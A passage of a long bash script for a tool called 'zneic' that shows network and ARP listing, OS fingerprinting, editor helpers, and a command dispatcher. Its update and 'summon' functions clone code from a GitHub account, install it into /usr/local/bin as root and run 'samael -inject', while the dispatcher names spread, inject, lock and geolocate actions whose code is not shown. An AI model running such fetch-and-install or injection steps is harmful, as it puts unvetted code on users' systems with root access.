       elif [[ $_system == "SunOS" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a | awk '{print $1,$3,$2}'
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "OS/390" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a | awk '{print $1,$3,$2}'
         printf "$WHITE\n"
         date
         printf "$NC\n"


       else

         printf "$RED Not supported sys$NC\n"

      fi

    else

      if [ $_system == "Darwin" ]; then

         printf "\n"
         printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2,$3,$4,$5,$6}')$NC\n"
         printf "\n"

         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "Linux" ]]; then

         printf "\n"
         printf "$WHITE$(nmcli -t -f active,ssid |grep enp0s3 | sed '$d' | awk '{print $4,$5,$6}')$NC\n"
         printf "\n"

         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "GNU" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "Haiku" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "HP-UX" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"



       elif [[ $_system == "Minix" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"


       elif [[ $_system == "OpenBSD" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "SunOS" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       elif [[ $_system == "OS/390" ]]; then

         printf "\n"
         printf "Router NAME\n"
         printf "\n"
         arp -a
         printf "$WHITE\n"
         date
         printf "$NC\n"

       else

         printf "$RED Not supported sys$NC\n"

      fi

    fi

    _u_data 2> /dev/null


}


_space(){ #selfc

   du -hs "$@" | sort -nr 2>/dev/null

   _u_data 2> /dev/null

}




_morph(){ #selfx







  if [ "$1" == "samsung" ]; then
    _samsung  $2

  elif [[ "$1" == "lg" ]]; then
    _lg  $2

  elif [[ "$1" == "apple" ]]; then
    _apple $2

  elif [[ "$1" == "huawei" ]]; then
    _huawei $2

  elif [[ "$1" == "xperia" ]]; then
    _xperia $2

  elif [[ "$1" == "oppo" ]]; then
    _oppo $2

  elif [[ "$1" == "yota" ]]; then
    _yota $2

  elif [[ "$1" == "lumia" ]]; then
    _lumia $2

  elif [[ "$1" == "nokia" ]]; then
    _nokia $2

  elif [[ "$1" == "htc" ]]; then
    _htc $2

  elif [[ "$1" == "hp" ]]; then
    _hp $2

  elif [[ "$1" == "dell" ]]; then
    _dell $2

  elif [[ "$1" == "ibm" ]]; then
    _ibm $2

  elif [[ "$1" == "microsoft" ]]; then
    _microsoft $2

  elif [[ "$1" == "lenovo" ]]; then
    _lenovo $2

  elif [[ "$1" == "intel" ]]; then
    _intel $2

  elif [[ "$1" == "amd" ]]; then
    _amd $2

  elif [[ "$1" == "nvidia" ]]; then
    _nvidia $2

  elif [[ "$1" == "one_plus" ]]; then
    _one_plus $2

  elif [[ "$1" == "airbus" ]]; then
    _airbus $2

  elif [[ "$1" == "boeing" ]]; then
    _boeing $2

  elif [[ "$1" == "lockheed" ]]; then
    _lockheed $2

  elif [[ "$1" == "northrop" ]]; then
    _northrop $2

  elif [[ "$1" == "bae" ]]; then
    _bae $2

  elif [[ "$1" == "bombardier" ]]; then
    _bombardier $2

  elif [[ "$1" == "tesla" ]]; then
    _tesla $2

  elif [[ "$1" == "toyota" ]]; then
    _toyota $2

  elif [[ "$1" == "porsche" ]]; then
    _porsche $2

  elif [[ "$1" == "us_army" ]]; then
    _us_army $2

  elif [[ "$1" == "parrot" ]]; then
    _parrot $2

  elif [[ "$1" == "nasa" ]]; then
    _nasa $2

  elif [[ "$1" == "tv" ]]; then
    _tv $2

  elif [[ "$1" == "magic" ]]; then
    printf "\n"
    printf " Samsung / Apple / LG / Opoo / One Plus / Huawei\n"
    printf " HP / Dell / IBM / Lenovo / Xperia / Yota / Nokia \n"
    printf " Xiaomi / HTC / Lumia / Tesla / Bombardier / Toyota \n"
    printf " Porsche / Boeing / Lockheed / Airbus / BAE / NASA / Parrot \n"
    printf " Northrop / Microsoft / US Army / TV / Intel / AMD \n"
    printf " Nvidia \n"
    printf "\n"
  else
    printf "$RED Morphing failed$NC\n"
  fi



}

_openWith(){ #selft
   open -a $1 $2

   _u_data 2> /dev/null
}

_thermic(){ #selfc

while true
   do
    clear
    istats | sed '$d'
    printf "$WHITE\n"
    date
    printf "$NC\n"
    sleep 1
   done



}


_repair(){ #selfi

  _system="$(uname -s)"


if [ $_system == "Darwin" ]; then

  if [ "$1" == "-g" ]; then

   cd ~
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   sudo chmod +x zneic
   sudo cp zneic /usr/local/bin
   cd .. ; cd ..
   sudo rm -rf foornal
   _ghost

 else

   cd ~
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   sudo chmod +x zneic
   sudo cp zneic /usr/local/bin
   cd .. ; cd ..
   sudo rm -rf foornal

 fi

 elif [[ $_system == "Linux" ]]; then

   cd ~
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   sudo chmod +x zneic
   sudo cp zneic /usr/local/bin
   cd .. ; cd ..
   sudo rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "GNU" ]]; then

   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "HP-UX" ]]; then

   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"


 elif [[ $_system == "Haiku" ]]; then

   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "Minix" ]]; then

   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "OpenBSD" ]]; then

   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "SunOS" ]]; then


   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "OS/390" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"


 else
   printf "$RED Not supported sys$NC\n"
 fi


}


_update(){ #selfi

  _system="$(uname -s)"


if [ $_system == "Darwin" ]; then

  if [ "$1" == "-g" ]; then

   cd ~
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   sudo chmod +x zneic
   sudo cp zneic /usr/local/bin
   cd .. ; cd ..
   sudo rm -rf foornal
   _ghost
   printf "$RED _updated$NC\n"

 else

   cd ~
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   sudo chmod +x zneic
   sudo cp zneic /usr/local/bin
   cd .. ; cd ..
   sudo rm -rf foornal
   printf "$RED _updated$NC\n"

 fi

 elif [[ $_system == "Linux" ]]; then

   cd ~
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   sudo chmod +x zneic
   sudo cp zneic /usr/local/bin
   cd .. ; cd ..
   sudo rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "GNU" ]]; then

   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "HP-UX" ]]; then

   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"


 elif [[ $_system == "Haiku" ]]; then

   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "Minix" ]]; then

   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "OpenBSD" ]]; then

   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "SunOS" ]]; then


   cd ~
   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"

 elif [[ $_system == "OS/390" ]]; then

   su
   mkdir foornal
   cd foornal
   git clone https://github.com/mldMoldovan/zneic.git -q >/dev/null
   cd zneic
   chmod +x zneic
   cp zneic /usr/local/bin
   cd .. ; cd ..
   rm -rf foornal
   printf "$RED _updated$NC\n"


 else
   printf "$RED Not supported sys$NC\n"
 fi


}


_brew(){ #selfx



   if [ $1 == "html" ]; then

       if [ $2 == "?" ]; then
       nano .brew.html
       else
       nano brew.html
       fi

   elif [[ $1 == "css" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.css
     else
        nano brew.css
     fi
   elif [[ $1 == "c++" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.cpp
     else
        nano brew.cpp
     fi
   elif [[ $1 == "java" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.java
     else
        nano brew.java
     fi
   elif [[ $1 == "xml" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.xml
     else
        nano brew.xml
     fi
   elif [[ $1 == "ts" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.ts
     else
        nano brew.ts
     fi
   elif [[ $1 == "c" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.c
     else
        nano brew.c
     fi
   elif [[ $1 == "sh" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.sh
     else
        nano brew.sh
     fi
   elif [[ $1 == "_h" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.h
     else
        nano brew.h
     fi
   elif [[ $1 == "js" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.js
     else
        nano brew.js
     fi
   elif [[ $1 == "json" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.json
     else
        nano brew.json
     fi
   elif [[ $1 == "rb" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.rb
     else
        nano brew.rb
     fi
   elif [[ $1 == "go" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.go
     else
        nano brew.go
     fi
   elif [[ $1 == "swift" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.swift
     else
        nano brew.swift
     fi
   elif [[ $1 == "objc" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.objc
     else
        nano brew.objc
     fi
   elif [[ $1 == "c#" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.cs
     else
        nano brew.cs
     fi
   elif [[ $1 == "bat" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.bat
     else
        nano brew.bat
     fi
   elif [[ $1 == "cmd" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.cmd
     else
        nano brew.cmd
     fi
   elif [[ $1 == "rex" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.rexx
     else
        nano brew.rexx
     fi
   elif [[ $1 == "perl" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.perl
     else
        nano brew.perl
     fi
   elif [[ $1 == "php" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.php
     else
        nano brew.php
     fi
   elif [[ $1 == "py" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.python
     else
        nano brew.python
     fi
   elif [[ $1 == "sql" ]]; then
     if [ $2 == "?" ]; then
        nano .brew.sql
     else
        nano brew.sql
     fi
   elif [[ $1 == "uxtl" ]]; then
     if [ $2 == "uname" ]; then
        printf "$RED Not supported yet$NC\n"
     elif [[ $2 == "hostname" ]]; then
        printf "$RED Not supported yet$NC\n"
     fi
   elif [[ $1 == "magic" ]]; then
     printf "\n"
     printf "$NEW_BLUE HTML / CSS / C++ / C / *SH / ^H$NC\n"
     printf "$NEW_BLUE JS / JSON / RB / SWIFT / *BAT / ^H$NC\n"
     printf "$NEW_BLUE TS / GO / PHP / SQL / PY / PERL$NC\n"
     printf "$NEW_BLUE REXX / CMD / C# / OBJC / JAVA / RUBY$NC\n"
     printf "$NEW_BLUE XML$NC\n"
     printf "\n"
   else
     printf "$NEW_BLUE Brew$YELLOW Error$NC\n"
   fi

   _u_data 2> /dev/null


}



_ros(){ #selfe



   if [ "$2" == "i" ]; then
     if [ -f /usr/local/bin/zneic ]; then
      zneic _wit? $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-11)$1 | sed 's/Aggressive OS guesses/Running/g' | grep 'Running:' | sed -n '1p' | grep -v 'WARNING' | awk '{print $2,$3,$4}'
     else
      xzneic _wit? $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-11)$1 | sed 's/Aggressive OS guesses/Running/g' | grep 'Running:' | sed -n '1p' | grep -v 'WARNING' | awk '{print $2,$3,$4}'
     fi
   else
     if [ -f /usr/local/bin/zneic ]; then
      zneic _wit? $1 | sed 's/Aggressive OS guesses/Running/g' | grep 'Running:' | sed -n '1p' | awk '{print $2,$3}'
     else
      xzneic _wit? $1 | sed 's/Aggressive OS guesses/Running/g' | grep 'Running:' | sed -n '1p' | awk '{print $2,$3}'
     fi
   fi

   _u_data 2> /dev/null

}




#selfx

_summon()(

_s_n_(){

    _system="$(uname -s)"

    if [ $_system == "Darwin" ]; then
      printf "$RED Summoning $1...$NC\n"
      cd ~
      mkdir .$1 ; cd .$1/
      git clone https://github.com/mldMoldovan/$1 -q >/dev/null 2>&1
      cd ./$1
      sudo chmod +x $1 ; sudo cp $1 /usr/local/bin/
      if [ "$1" == "samael" ]; then
        samael -inject
      fi
      cd .. ; cd .. ; rm -rf .$1
      printf "$RED $1 is here $NC\n"
    elif [[ $_system == "Linux" ]]; then
      printf "$RED Summoning $1...$NC\n"
      cd ~
      mkdir .$1 ; cd .$1/
      git clone https://github.com/mldMoldovan/$1 -q >/dev/null 2>&1
      cd ./$1
      sudo chmod +x $1 ; sudo cp $1 /usr/local/bin/
      cd .. ; cd .. ; rm -rf .$1
      printf "$RED $1 is here $NC\n"
    elif [[ $_system == "GNU" ]]; then
      printf "$RED Summoning $1...$NC\n"
      cd ~
      mkdir .$1 ; cd .$1/
      git clone https://github.com/mldMoldovan/$1 -q >/dev/null 2>&1
      cd ./$1
      chmod +x $1
      printf "$RED Kolya is here $NC\n"
    elif [[ $_system == "Haiku" ]]; then
      printf "$RED Summoning $1...$NC\n"
      cd ~
      mkdir .$1 ; cd .$1/
      git clone https://github.com/mldMoldovan/$1 -q >/dev/null 2>&1
      cd ./$1
      chmod +x $1
      printf "$RED Kolya is here $NC\n"
    elif [[ $_system == "HP-UX" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "Minix" ]]; then
      printf "$RED Summoning $1...$NC\n"
      cd ~
      mkdir .$1 ; cd .$1/
      git clone https://github.com/mldMoldovan/$1 -q >/dev/null 2>&1
      cd ./$1
      chmod +x $1 ; cp $1 /usr/local/bin/
      cd .. ; cd .. ; rm -rf .$1
      printf "$RED $1 is here $NC\n"
    elif [[ $_system == "OpenBSD" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "OS/390" ]]; then
      printf "$RED Not supported yet$NC\n"
    else
      printf "$RED Not supported sys$NC\n"
    fi


}






   if [ "$1" == "magic" ]; then
      printf "$RED Roi $YELLOW Wilfred $GREEN Salazaar $BLUE Ryan $WHITE Shinigami $NEW_BLUE Samael$NC\n"
   elif [[ "$1" == "roi" ]]; then
      _s_n_ roi
   elif [[ "$1" == "wilfred" ]]; then
      _s_n_ wilfred
   elif [[ "$1" == "salazaar" ]]; then
      _s_n_ salazaar
   elif [[ "$1" == "ryan" ]]; then
      _s_n_ ryan
   elif [[ "$1" == "shinigami" ]]; then
      _s_n_ shinigami
   elif [[ "$1" == "samael" ]]; then
      _s_n_ samael
   elif [[ "$1" == "x" ]]; then
      cd /usr/local/bin/
      if [ "$(ls -la | grep -c 'roi')" == "1" ]; then
         printf "Roi "
      fi
      if [ "$(ls -la | grep -c 'ryan')" == "1" ]; then
         printf "Ryan "
      fi
      if [ "$(ls -la | grep -c 'zneic')" == "1" ]; then
         printf "zneic "
      fi
      if [ "$(ls -la | grep -c 'samael')" == "1" ]; then
         printf "Samael "
      fi
      if [ "$(ls -la | grep -c 'wilfred')" == "1" ]; then
         printf "zneic "
      fi
      if [ "$(ls -la | grep -c 'salazaar')" == "1" ]; then
         printf "Salazaar "
      fi
      if [ "$(ls -la | grep -c 'shinigami')" == "1" ]; then
         printf "Shinigami "
      fi
      printf "\n"
      cd ~
   else
      _s_n_ $1
   fi


)



_badblood(){

while true
do
    _blood
    sleep $1
done

}







# HERE YOU GO

if [ "$1" == "-v" ]; then


  printf "\n"
  printf "        $_name    \n"
  printf "          $_version                 \n"
  printf "\n"

  _u_data 2> /dev/null


elif [[ "$1" == "-vh" || "$1" == "-hv" ]]; then

  printf "\n"
  printf "$_name\n"
  printf "\n"
  printf "Usage:  zneic [-vhrage] [--summon <daemon> ]\n"
  printf "\n"
  printf "Options: -v - Show version info\n"
  printf "         -h - Show help menu\n"
  printf "         -r - research\n"
  printf "         -a - affichage\n"
  printf "         -g - generalize\n"
  printf "         -e - engage\n"
  printf "         --summon - Daemons!\n"
  printf "         --morph - MAC-only\n"
  printf "         --brew - Just magic\n"
  printf "         --meta - Whatever \n"
  printf "\n"
  printf "Examples: zneic -p\n"
  printf "          zneic --summon Artyom\n"
  printf "          zneic --opaa\n"
  printf "\n"

  _u_data 2> /dev/null


elif [[ "$1" == "-h" ]]; then

  printf "\n"
  printf "$_name\n"
  printf "\n"
  printf "Usage:  zneic [-vhrage] [--summon <daemon> ]\n"
  printf "\n"
  printf "Options: -v - Show version info\n"
  printf "         -h - Show help menu\n"
  printf "         -r - research\n"
  printf "         -a - affichage\n"
  printf "         -g - generalize\n"
  printf "         -e - engage\n"
  printf "\n"
  printf "Examples: zneic -p\n"
  printf "          zneic --summon Artyom\n"
  printf "          zneic --opaa\n"
  printf "\n"

  _u_data 2> /dev/null



if [ "$2" == "-v" ]; then
  printf "\n"
  printf "$_name\n"
  printf "\n"
  printf "Usage:  zneic [-vhrage] [--summon <daemon> ]\n"
  printf "\n"
  printf "Options: -v - Show version info\n"
  printf "         -h - Show help menu\n"
  printf "         -r - research\n"
  printf "         -a - affichage\n"
  printf "         -g - generalize\n"
  printf "         -e - engage\n"
  printf "         --summon - Daemons!\n"
  printf "         --morph - MAC-only\n"
  printf "         --brew - Just magic\n"
  printf "         --meta - Whatever\n"
  printf "\n"
  printf "Examples: zneic -p\n"
  printf "          zneic --summon Artyom\n"
  printf "          zneic --opaa\n"
  printf "\n"

  _u_data 2> /dev/null


fi


elif [ "$1" == "-g" ]; then

   _generalize $2

 elif [ "$1" == "-gf" ]; then

   _generalize -f

elif [[ "$1" == "-a" ]]; then

  _affichage

elif [[ "$1" == "-r" ]]; then

   _research

elif [[ "$1" == "-e" ]]; then

   _engage

elif [[ "$1" == "--spread" ]]; then

    _spread
    printf "$_name $RED _spread$NC\n"

elif [[ "$1" == "-spread" ]]; then

    _spread
    printf "$_name $RED _spread$NC\n"

elif [[ "$1" == "--nest" ]]; then

     _exec

elif [[ "$(echo $1 | grep -c 'look')" == "1" ]]; then

     _look

elif [[ "$(echo $1 | grep -c 'qinstall')" == "1" ]]; then

    _exec_q

elif [[ "$(echo $1 | grep -c 'uninstall')" == "1" || "$(echo $1 | grep -c 'dsp')" == "1" ]]; then

     _exec_u

elif [[ "$(echo $1 | grep -c 'install')" == "1" ]]; then

     _exec_i $2

elif [[ "$(echo $1 | grep -c 'backup')" == "1" || "$(echo $1 | grep -c 'bkp')" == "1" ]]; then

     _exec_b $2

elif [[ "$1" == "-alive" ]]; then

    _self alive

elif [[ "$(echo $1 | grep -c 'ther')" == "1" ]]; then

    _thermic

elif [[ "$(echo $1 | grep -c 'space')" == "1" ]]; then

    _space

elif [[ "$(echo $1 | grep -c 'db')" == "1" ]]; then

      _self $2 $3 $4

elif [[ "$1" == "oui" || "$1" == "-oui" || "$1" == "--oui" ]]; then

     _vndr $2

elif [[ "$1" == "morph" || "$1" == "-morph" || "$1" == "--morph" ]]; then

     _morph $2 $3

elif [[ "$(echo $1 | grep -c 'meta')" == "1" ]]; then

     _metamorph $2 $3 $4 $5

elif [[ "$(echo $1 | grep -c 'opaa')" == "1" ]]; then

     _opaa

elif [[ "$(echo $1 | grep -c 'snap')" == "1" ]]; then

     _snap

elif [[ "$(echo $1 | grep -c 'mnet')" == "1" ]]; then

        _magnet $2



elif [[ "$(echo $1 | grep -c 'decompose')" == "1" ]]; then

     _decompose

elif [[ "$(echo $1 | grep -c 'ports')" == "1" ]]; then

     _ports $2 $3

elif [[ "$(echo $1 | grep -c 'docked')" == "1" ]]; then

     _docked $2

elif [[ "$(echo $1 | grep -c 'radar')" == "1" ]]; then

     _radar

elif [[ "$(echo $1 | grep -c 'suicide')" == "1" ]]; then

    _suicide

elif [[ "$(echo $1 | grep -c 'reboot')" == "1" ]]; then

    _reboot

elif [[ "$(echo $1 | grep -c 'purge')" == "1" ]]; then

     _purge

elif [[ "$(echo $1 | grep -c 'maid')" == "1" ]]; then

     _maid $2

elif [[ "$(echo $1 | grep -c 'ash')" == "1" ]]; then

     _ash

elif [[ "$(echo $1 | grep -c 'cheese')" == "1" ]]; then

     _cheese

elif [[ "$(echo $1 | grep -c 'piece')" == "1" ]]; then

     _piece $2

elif [[ "$(echo $1 | grep -c 'mb')" == "1" ]]; then

     _mb $2

elif [[ "$(echo $1 | grep -c 'poof')" == "1" ]]; then

     _poof

elif [[ "$(echo $1 | grep -c 'clear')" == "1" ]]; then

     _clear

elif [[ "$(echo $1 | grep -c 'lock')" == "1" ]]; then

     _lock

elif [[ "$(echo $1 | grep -c 'inject')" == "1" ]]; then

     _inject $2 $3

elif [[ "$(echo $1 | grep -c 'geolocate')" == "1" ]]; then

     _geolocate $2

elif [[ "$1" == "_wit?" ]]; then

     _wit $2 $3

elif [[ "$1" == "_wit??" ]]; then

     _wit6 $2 $3

elif [[ "$1" == "_wth?" ]]; then

     _wth $2 $3

elif [[ "$1" == "_wth??" ]]; then

     _wth6 $2 $3

elif [[ "$1" == "_col!" ]]; then

     _col $2 $3

elif [[ "$1" == "_col!?" ]]; then

     _col6 $2 $3

elif [[ "$1" == "_wtf?" ]]; then

    _wtf $2 $3

elif [[ "$1" == "_wtf??" ]]; then

    _wtf6 $2 $3

elif [[ "$1" == "_blyat!" ]]; then

    _blyat $2 $3

elif [[ "$1" == "_blyat!?" ]]; then

    _blyat6 $2 $3

elif [[ "$1" == "_pizdec!" ]]; then

   _pizdec $2 $3

elif [[ "$1" == "_pizdec!?" ]]; then

   _pizdec6 $2 $3

elif [[ "$1" == "_IP!" ]]; then

   _IP $2

